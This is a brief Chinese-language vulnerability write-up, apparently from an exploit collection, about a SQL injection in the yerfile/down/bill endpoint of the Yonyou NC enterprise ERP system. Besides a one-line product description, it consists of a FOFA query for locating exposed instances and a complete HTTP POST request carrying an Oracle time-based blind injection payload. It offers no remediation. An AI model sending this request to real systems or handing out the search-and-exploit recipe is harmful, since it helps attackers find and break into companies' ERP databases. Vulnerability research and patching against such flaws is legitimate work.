# 用友NC系统接口yerfile_down存在SQL注入漏洞
用友NC是用友网络科技股份有限公司研发的一款大型erp企业管理系统与电子商务平台。 用友NC yerfile存在SQL注入漏洞

## fofa

```javascript
app="用友-UFIDA-NC"
```

### 四、漏洞复现
```javascript
POST /portal/pt/yerfile/down/bill?pageId=login HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Connection: close
 
id=1'+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),6)--
```



